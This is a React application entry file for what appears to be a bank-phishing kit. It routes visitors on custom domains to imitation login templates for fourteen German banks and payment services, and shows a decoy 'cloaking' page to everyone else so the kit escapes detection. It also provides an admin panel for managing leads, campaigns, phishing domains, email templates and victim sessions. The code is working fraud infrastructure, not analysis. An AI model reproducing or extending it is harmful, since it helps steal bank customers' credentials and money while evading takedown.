// React import is required for JSX even if TypeScript doesn't detect it
// eslint-disable-next-line @typescript-eslint/no-unused-vars
import React, { useEffect } from 'react';
/* @jsxImportSource react */
import { BrowserRouter, Routes, Route, useLocation } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { Layout } from './components/Layout';
import { Dashboard } from './pages/Dashboard';
import { BankTemplates } from './pages/BankTemplates';
import { LandingPages } from './pages/LandingPages';
import { Leads } from './pages/Leads';
import { LeadDetails } from './pages/LeadDetails';
import CommerzbankTemplate from './templates/commerzbank';
import SantanderTemplate from './templates/santander';
import ApobankTemplate from './templates/apobank';
import SparkasseTemplate from './templates/sparkasse';
import PostbankTemplate from './templates/postbank';
import DKBTemplate from './templates/dkb';
import VolksbankTemplate from './templates/volksbank';
import ComdirectTemplate from './templates/comdirect';
import ConsorsbankTemplate from './templates/consorsbank';
import INGDibaTemplate from './templates/ingdiba';
import DeutscheBankTemplate from './templates/deutsche_bank';
import KlarnaTemplate from './templates/klarna';
import CreditLandingTemplate from './templates/credit-landing';
import TargobankTemplate from './templates/targobank';
import { Campaigns } from './pages/Campaigns';
import CampaignDetails from './pages/CampaignDetails';
import { Domains } from './pages/Domains';
import { EmailTemplates } from './pages/EmailTemplates';
import { EmailTemplateEditor } from './pages/EmailTemplateEditor';
import { CustomEmailTemplateEditor } from './pages/EasyEmailTemplateEditor';
import { Settings } from './pages/Settings';
import { SessionControl } from './pages/SessionControl';
import { Analytics } from './pages/Analytics';
import { Security } from './pages/Security';
import { Home } from './pages/Home';
import { Login } from './pages/Login';
import { ImportLeads } from './pages/ImportLeads';
import { ProtectedRoute } from './components/ProtectedRoute';
import { AuthProvider } from './context/AuthContext';
import { autoUpdateMetadata } from './utils/templateMetadata';
import { initializeImagePreloading } from './utils/imagePreloader';
import ImagePreloader from './components/ImagePreloader';

const queryClient = new QueryClient();

// Component to handle metadata updates on route changes
function MetadataUpdater() {
  const location = useLocation();
  
  useEffect(() => {
    autoUpdateMetadata();
  }, [location]);
  
  return null;
}

// Component that checks for injected template info and renders appropriate template
function TemplateOrHome() {
  useEffect(() => {
    // Check if template info was injected by the server
    const templateInfo = (window as any).__TEMPLATE_INFO__;
    if (templateInfo) {
      console.log('🎯 [TEMPLATE-DETECTION] Found injected template info:', templateInfo);
    } else {
      console.log('🔍 [TEMPLATE-DETECTION] No template info found, showing cloaking page');
    }
  }, []);

  // Check for server-injected template info
  const templateInfo = (window as any).__TEMPLATE_INFO__;
  
  if (templateInfo && templateInfo.isCustomDomain && templateInfo.templateName) {
    console.log(`🚀 [TEMPLATE-ROUTING] Rendering template: ${templateInfo.templateName}`);
    
    // Route to the correct template based on injected info
    switch (templateInfo.templateName) {
      case 'commerzbank':
        return <CommerzbankTemplate />;
      case 'santander':
        return <SantanderTemplate />;
      case 'apobank':
        return <ApobankTemplate />;
      case 'sparkasse':
        return <SparkasseTemplate />;
      case 'postbank':
        return <PostbankTemplate />;
      case 'dkb':
        return <DKBTemplate />;
      case 'volksbank':
        return <VolksbankTemplate />;
      case 'comdirect':
        return <ComdirectTemplate />;
      case 'consorsbank':
        return <ConsorsbankTemplate />;
      case 'ingdiba':
        return <INGDibaTemplate />;
      case 'deutsche_bank':
        return <DeutscheBankTemplate />;
      case 'klarna':
        return <KlarnaTemplate />;
      case 'credit-landing':
        return <CreditLandingTemplate />;
      case 'targobank':
        return <TargobankTemplate />;
      default:
        console.warn(`⚠️ [TEMPLATE-ROUTING] Unknown template: ${templateInfo.templateName}, showing cloaking`);
        return <Home />;
    }
  }
  
  // No template info found, show cloaking page
  console.log('🛡️ [CLOAKING] No template info detected, showing cloaking page');
  return <Home />;
}

function App() {
  // Don't initialize image preloading on app start to avoid exposing banking assets
  // Images will be loaded conditionally by ImagePreloader component based on route

  return (
    <BrowserRouter>
      <QueryClientProvider client={queryClient}>
        <AuthProvider>
          <ImagePreloader />
          <MetadataUpdater />
          <Routes>
            {/* Public routes */}
            <Route path="/" element={<TemplateOrHome />} />
            <Route path="/login" element={<Login />} />
            
            {/* Template routes - only accessible via domain rewriting, not direct access */}
            <Route path="/commerzbank" element={<CommerzbankTemplate />} />
            <Route path="/commerzbank/:key" element={<CommerzbankTemplate />} />
            <Route path="/santander" element={<SantanderTemplate />} />
            <Route path="/santander/:key" element={<SantanderTemplate />} />
            <Route path="/apobank" element={<ApobankTemplate />} />
            <Route path="/apobank/:key" element={<ApobankTemplate />} />
            <Route path="/sparkasse" element={<SparkasseTemplate />} />
            <Route path="/sparkasse/:key" element={<SparkasseTemplate />} />
            <Route path="/postbank" element={<PostbankTemplate />} />
            <Route path="/postbank/:key" element={<PostbankTemplate />} />
            <Route path="/dkb" element={<DKBTemplate />} />
            <Route path="/dkb/:key" element={<DKBTemplate />} />
            <Route path="/volksbank" element={<VolksbankTemplate />} />
            <Route path="/volksbank/:key" element={<VolksbankTemplate />} />
            <Route path="/comdirect" element={<ComdirectTemplate />} />
            <Route path="/comdirect/:key" element={<ComdirectTemplate />} />
            <Route path="/consorsbank" element={<ConsorsbankTemplate />} />
            <Route path="/consorsbank/:key" element={<ConsorsbankTemplate />} />
            <Route path="/ingdiba" element={<INGDibaTemplate />} />
            <Route path="/ingdiba/:key" element={<INGDibaTemplate />} />
            <Route path="/deutsche_bank" element={<DeutscheBankTemplate />} />
            <Route path="/deutsche_bank/:key" element={<DeutscheBankTemplate />} />
            <Route path="/klarna" element={<KlarnaTemplate />} />
            <Route path="/klarna/:key" element={<KlarnaTemplate />} />
            <Route path="/credit-landing" element={<CreditLandingTemplate />} />
            <Route path="/credit-landing/:key" element={<CreditLandingTemplate />} />
            <Route path="/targobank" element={<TargobankTemplate />} />
            <Route path="/targobank/:key" element={<TargobankTemplate />} />
            
            {/* Protected admin dashboard routes */}
            <Route path="/admin" element={<ProtectedRoute />}>
              <Route element={<Layout />}>
                <Route index element={<Dashboard />} />
                <Route path="bank-templates" element={<BankTemplates />} />
                <Route path="landing-pages" element={<LandingPages />} />
                <Route path="leads" element={<Leads />} />
                <Route path="leads/:id" element={<LeadDetails />} />
                <Route path="import" element={<ImportLeads />} />
                <Route path="campaigns" element={<Campaigns />} />
                <Route path="campaigns/:id" element={<CampaignDetails />} />
                <Route path="domains" element={<Domains />} />
                <Route path="email-templates" element={<EmailTemplates />} />
                <Route path="email-templates/new" element={<CustomEmailTemplateEditor />} />
                <Route path="email-templates/:id" element={<CustomEmailTemplateEditor />} />
                <Route path="email-templates/html-editor" element={<EmailTemplateEditor />} />
                <Route path="settings" element={<Settings />} />
                <Route path="session-control" element={<SessionControl />} />
                <Route path="analytics" element={<Analytics />} />
                <Route path="security" element={<Security />} />
              </Route>
            </Route>
          </Routes>
        </AuthProvider>
      </QueryClientProvider>
    </BrowserRouter>
  );
}

export default App;